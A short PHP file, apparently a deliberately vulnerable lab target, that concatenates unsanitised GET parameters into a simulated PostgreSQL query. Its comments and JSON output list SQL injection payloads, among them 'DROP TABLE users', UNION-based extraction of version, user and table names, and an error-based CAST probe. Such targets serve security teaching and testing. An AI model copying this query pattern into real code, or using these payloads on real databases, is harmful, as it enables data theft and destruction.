<?php
// Podatne na SQL Injection w PostgreSQL - brak prepared statements
header("Content-Type: application/json");

// Symulacja połączenia z PostgreSQL (w rzeczywistości byłoby: pg_connect())
// W prawdziwej aplikacji byłoby:
// $conn = pg_connect("host=localhost dbname=testdb user=admin password=secret");
// $query = "SELECT * FROM users WHERE id = " . $_GET["id"];

$id = $_GET["id"] ?? "1";
$email = $_GET["email"] ?? "";

// Podatne zapytanie PostgreSQL - bez prepared statements
// Możliwe ataki:
// ?id=1; DROP TABLE users;--
// ?id=1' UNION SELECT NULL, version(), NULL--
// ?id=1' UNION SELECT NULL, current_user, NULL--
// ?id=1' AND 1=CAST((SELECT version()) AS int)--

$sql = "SELECT id, email, role FROM users WHERE id = " . $id;

if ($email) {
    $sql .= " AND email = '" . $email . "'";
}

// Symulacja wyników (w prawdziwej aplikacji byłoby: pg_query($conn, $sql))
$users = [
    1 => ["id" => 1, "email" => "admin@example.com", "role" => "admin"],
    2 => ["id" => 2, "email" => "user@example.com", "role" => "user"]
];

// Symulacja wykonania zapytania
echo json_encode([
    "query" => $sql,
    "vulnerable" => true,
    "database" => "PostgreSQL",
    "test_payloads" => [
        "Basic: ?id=1' OR '1'='1",
        "Union: ?id=1' UNION SELECT NULL, version(), NULL--",
        "Version: ?id=1' AND 1=CAST((SELECT version()) AS int)--",
        "Drop: ?id=1; DROP TABLE users;--",
        "Current User: ?id=1' UNION SELECT NULL, current_user, NULL--",
        "Database: ?id=1' UNION SELECT NULL, current_database(), NULL--",
        "Tables: ?id=1' UNION SELECT NULL, table_name, NULL FROM information_schema.tables--"
    ],
    "note" => "This is a simulated PostgreSQL SQL Injection vulnerability. In real app, use pg_prepare() and pg_execute()"
]);

